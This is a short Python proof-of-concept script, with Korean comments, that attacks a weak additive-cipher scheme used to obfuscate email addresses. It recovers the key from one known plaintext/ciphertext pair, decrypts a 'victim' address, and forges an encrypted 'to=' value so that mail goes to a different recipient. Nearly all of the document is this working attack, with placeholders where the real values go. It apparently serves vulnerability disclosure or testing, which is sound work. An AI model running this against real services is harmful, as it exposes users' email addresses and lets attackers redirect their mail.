import base64

# salt key 추출 함수
def extract_salt_key(enc_email: str, plain_email: str) -> str:
    enc_bytes = base64.b64decode(enc_email.replace('.', '+').replace('_', '/').replace('-', '='))
    plain_bytes = bytearray(plain_email, 'utf-8')
    key = ""

    for i in range(len(enc_bytes)):
        key += chr(enc_bytes[i] - plain_bytes[i])

    return key


# 이메일 복호화 함수
def decrypt_email(enc_email: str, key: str) -> str:
    enc_email = enc_email.replace('.', '+').replace('_', '/').replace('-', '=')
    enc_bytes = base64.b64decode(enc_email)
    result = ""

    for i in range(len(enc_bytes)):
        result += chr(enc_bytes[i] - ord(key[i % len(key)]))

    return result


# 이메일 암호화 함수
def encrypt_email(plain_email: str, key: str) -> str:
    enc_bytes = bytearray()

    for i in range(len(plain_email)):
        enc_char = ord(plain_email[i]) + ord(key[i % len(key)])
        enc_bytes.append(enc_char)

    b64 = base64.b64encode(enc_bytes).decode()
    return b64.replace('+', '.').replace('/', '_').replace('=', '-')



# key 추출을 위한 계정
known_plain_email = "{plain_email}"
known_enc_email = "{encrypted_email}"

key = extract_salt_key(known_enc_email, known_plain_email)
print("key(salt) 추출 : ", key)


# email 계정의 encrypt 결과를 알 경우, 이메일 복호화 (key를 구했다는 가정)
victim_enc_email = "{encrypted_email}"
decrypted = decrypt_email(victim_enc_email, key)
print("복호화된 이메일 : ", decrypted)

# 다른 사람의 이메일을 알 경우 >> encrypt 가능 >> 메일 수신자 교체 가능 ( key를 구했다는 가정 )
target_email = "{plain_email}"
forged = encrypt_email(target_email, key)
print("위조한 암호화 이메일(to=):", forged)
